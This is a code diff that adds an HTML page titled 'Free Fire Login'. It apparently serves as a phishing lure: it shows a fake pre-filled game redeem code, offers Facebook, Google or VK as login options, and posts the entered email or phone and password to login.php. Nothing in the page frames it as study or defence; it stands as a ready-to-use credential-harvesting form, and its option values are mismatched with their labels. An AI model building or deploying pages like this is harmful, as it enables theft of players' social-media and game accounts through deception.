@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Free Fire Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="style.css">
+  </head>
+  <body>
+    <div class="container">
+      <form action="login.php" method="post">
+        <img src="free-fire-logo.png" alt="Free Fire Logo" class="logo">
+        <div class="form-group">
+          <label for="redeem-code">Redeem Code</label>
+          <input type="text" value="ABCDEFGHIJKLM" id="redeem-code" name="redeem-code" readonly>
+        </div>
+        <label for="login-method" class="login">Select a login method:</label>
+        <select id="login-method" name="login-method">
+          <option value="email-password">Facebook</option>
+          <option value="google">Google</option>
+          <option value="facebook">VK</option>
+        </select>
+        <br>
+        <div class="form-group">
+          <label for="username">Email or Phone</label>
+          <input type="text" id="username" name="username" required>
+        </div>
+        <div class="form-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" required>
+        </div>
+        <div class="form-group">
+          <label for="redeem-code">Redeem Code</label>
+          <input type="text" id="redeem-code" name="redeem-code">
+        </div>
+        <button type="submit">Log In</button>
+      </form>
+    </div>
+  </body>
+</html>
